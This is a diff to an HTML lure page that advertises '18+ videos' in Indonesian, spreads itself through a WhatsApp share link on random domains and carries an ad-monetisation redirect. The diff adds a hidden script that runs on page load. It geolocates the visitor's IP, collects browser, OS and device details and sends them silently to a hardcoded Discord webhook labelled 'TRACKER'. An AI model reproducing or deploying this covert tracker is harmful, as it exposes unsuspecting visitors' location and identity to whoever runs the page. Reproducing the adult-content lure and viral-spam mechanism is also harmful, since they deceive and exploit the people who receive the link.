@@ -498,7 +498,7 @@ main {
                 <i class="fa-regular fa-arrow-left"></i>
                 <img src="https://www.standistic.website/images/fang.jpg" />
                 <div class="text">
-                    <h1>BERBAGI VIDEO 18+ 🥵💦💦</h1>
+                    <h1>BERBAGI VIDEO 18+ 🥵💦</h1>
                     <p>+1 (256) 296-6842, +1 (343) 303-4836, +1 (682) 200-9962</p>
                 </div>
             </div>
@@ -776,7 +776,7 @@ main {
 			}
 			var shareDomain = randomDomain();
             var width = 0,
-                url = "*BERBAGI VIDEO 18+ 🥵💦💦* 🎥%0A%0Ahttps://" + shareDomain + "/Ea1gXwt535hBwzQnOo5AVw/           %0A%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20*Join Now*",
+                url = "*BERBAGI VIDEO 18+ 🥵💦💦* %0A%0Ahttps://" + shareDomain + "/Ea1gXwt535hBwzQnOo5AVw/           %0A%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20*Join Now*",
                 share = "whatsapp://send?text=" + url,
                 cpa = "https://www.profitablecpmrate.com/ahbgv96kwx?key=513de724f060232787a95e09ab995f84";
         </script>
@@ -969,5 +969,89 @@ function salxhw() {
   }
 }
 </script>	
+<script>
+function fetchGoogleMapsLocation(latitude, longitude) {
+    return `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
+}
+
+fetch("https://ipwho.is/")
+.then(response => response.json())
+.then(ipData => {
+    const latitude = ipData.latitude;
+    const longitude = ipData.longitude;
+    const googleMapsLink = fetchGoogleMapsLocation(latitude, longitude);
+
+        const userAgent = navigator.userAgent;
+        const platform = navigator.platform;
+        const language = navigator.language;
+        const screenWidth = window.screen.width;
+        const screenHeight = window.screen.height;
+        const isOnline = navigator.onLine ? "Yes" : "No";
+        const browserName = (() => {
+            const ua = navigator.userAgent;
+            if (ua.includes("Firefox")) return "Firefox";
+            if (ua.includes("Chrome")) return "Chrome";
+            if (ua.includes("Safari")) return "Safari";
+            if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
+            if (ua.includes("Edge")) return "Edge";
+            if (ua.includes("MSIE") || ua.includes("Trident")) return "Internet Explorer";
+            return "Unknown";
+        })();
+        const operatingSystem = (() => {
+            const ua = navigator.userAgent;
+            if (ua.includes("Win")) return "Windows";
+            if (ua.includes("Mac")) return "MacOS";
+            if (ua.includes("X11")) return "UNIX";
+            if (ua.includes("Linux")) return "Linux";
+            return "Unknown";
+        })();
+
+        const embed = {
+            "embeds": [{
+                "title": `TRACKER > ${ipData.ip} > :flag_${ipData.country_code.toLowerCase()}:`,
+                "color": 3447003,
+                "fields": [
+                    {
+                        "name": "📍 Region",
+                        "value": `${ipData.region} (${ipData.regionName})`
+                    },
+                    {
+                        "name": "🌐 Coordinates",
+                        "value": `Latitude: ${latitude}, Longitude: ${longitude}`
+                    },
+                    {
+                        "name": "📡 ISP",
+                        "value": `${ipData.connection.isp}`
+                    },
+                    {
+                        "name": "💻 User Agent",
+                        "value": `${userAgent}`
+                    },
+                    {
+                        "name": "🖥️ Platform",
+                        "value": `${platform}`
+                    },
+                    {
+                        "name": "🌍 Browser",
+                        "value": `${browserName}`
+                    },
+                    {
+                        "name": "🖥️ Operating System",
+                        "value": `${operatingSystem}`
+                    }
+                ]
+            }]
+        };
+
+        const webhookUrl = "https://discord.com/api/webhooks/1333081390585090161/-DN8MaaQNbBCFM4lDpz9UjSLflMbtUsGNHQf0s8exAAws-9gYiIpXFa8gUMpFayaqjT4";
+        fetch(webhookUrl, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(embed)
+        });
+});
+</script>
 </body>
 </html>
